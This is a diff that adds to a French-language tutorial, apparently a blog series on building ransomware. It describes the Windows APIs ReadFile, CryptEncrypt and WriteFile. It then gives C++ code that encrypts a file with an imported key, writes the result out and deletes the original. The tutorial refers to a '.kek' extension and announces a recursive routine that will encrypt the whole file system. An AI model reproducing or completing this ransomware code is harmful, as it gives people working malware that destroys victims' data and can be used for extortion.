@@ -165,4 +165,117 @@ Après l'ouverture des deux handles, nous lisons une plage de bytes pré-déterm
 
 Pour ce faire, nous allons utiliser un trio de fonctions spécifiques ;
 
-### 
+### ReadFile
+
+Comme sont nom l'indique, cette fonction lit des données depuis un fichier (supposant donc la création d'une handle vers ledit fichier en amont).
+
+```cpp
+BOOL ReadFile(
+  [in]                HANDLE       hFile,
+  [out]               LPVOID       lpBuffer,
+  [in]                DWORD        nNumberOfBytesToRead,
+  [out, optional]     LPDWORD      lpNumberOfBytesRead,
+  [in, out, optional] LPOVERLAPPED lpOverlapped
+);
+```
+
+### CryptEncrypt
+
+Cette fonction, en utilisant une clé précédemment importée (donc dans notre cas via CryptImportKey), chiffre des données passés en paramètre.
+
+```cpp
+BOOL CryptEncrypt(
+  [in]      HCRYPTKEY  hKey,
+  [in]      HCRYPTHASH hHash,
+  [in]      BOOL       Final,
+  [in]      DWORD      dwFlags,
+  [in, out] BYTE       *pbData,
+  [in, out] DWORD      *pdwDataLen,
+  [in]      DWORD      dwBufLen
+);
+```
+
+
+### WriteFile
+
+Cousine de ReadFile, cette fonction, comme son nom n'indique, écrit des données dans un fichier (en utilisant la même handle vers ledit fichier, créée au préalable)
+
+```cpp
+BOOL WriteFile(
+  [in]                HANDLE       hFile,
+  [in]                LPCVOID      lpBuffer,
+  [in]                DWORD        nNumberOfBytesToWrite,
+  [out, optional]     LPDWORD      lpNumberOfBytesWritten,
+  [in, out, optional] LPOVERLAPPED lpOverlapped
+);
+```
+
+## Le chiffrement des fichiers avec une clé : pratique
+
+Voilà donc à quoi ressemble le code final pour le chiffrement d'un fichier. 
+
+
+```cpp
+  hSourceFile = CreateFileW(szOGFileName, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+  if (hSourceFile == INVALID_HANDLE_VALUE) {
+
+    DWORD d = GetLastError();
+    std::cout << "Error opening handle to the sourcefile, error code: " << d << std::endl;
+    return -1;
+  }
+
+
+  hDestFile = CreateFileW(pzDestFile, FILE_WRITE_DATA | DELETE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+  if (INVALID_HANDLE_VALUE == hDestFile) {
+
+    DWORD d = GetLastError();
+    std::cout << "Error opening handle to the destfile, error code 0x8" << d << std::endl;
+    return -1;
+  }
+
+  while (eof == 0) {
+
+    if (ReadFile(hSourceFile, pbBuffer, dwBlockLen, &dwCount, NULL) == 0) {
+      DWORD d = GetLastError();
+      std::cout << "Error reading from the sourcefile, error code 0x8:" << d << std::endl;
+      break;
+
+    }
+    
+    if (dwCount < dwBlockLen) {
+
+      eof = 1;
+    }
+
+    if (CryptEncrypt(clé, 0, eof, 0, (BYTE*)pbBuffer, &dwCount, dwBufferLen) == 0) {
+
+      DWORD d = GetLastError();
+      std::cout << "Error encrypting the buffer, error code 0x" << d << std::endl;
+      break;
+
+    }
+
+    if (WriteFile(hDestFile, pbBuffer, dwCount, &dwCount, NULL) == 0) {
+
+      DWORD d = GetLastError();
+      std::cout << "Error writing to the destfile, error code 0x:" << d << std::endl;
+      break;
+
+
+    }
+  }
+
+  CloseHandle(hSourceFile);
+  CloseHandle(hDestFile);
+
+  if (DeleteFile(szOGFileName) == 0) {
+    DWORD d = GetLastError();
+    std::cout << "Error deleting the OG file, error code 0x:" << d << std::endl;
+    return -1;
+
+}
+  ```
+
+  A noter que je n'ai pas inclus certaines opérations lambda, comme par exemple de la manipulation de strings afin d'assurer que le fichier de destination aie l'extension ".kek" mentionnée dans la partie précédente.
+
+  Maintenant que les opérations de chiffrement basiques sont prêtes, il nous faut écrire un petit algorithme récursif qui se chargera d'itérer le système de fichier et d'exécuter la routine de chiffrement, à plusieurs degrés de profondeur si besoin est.
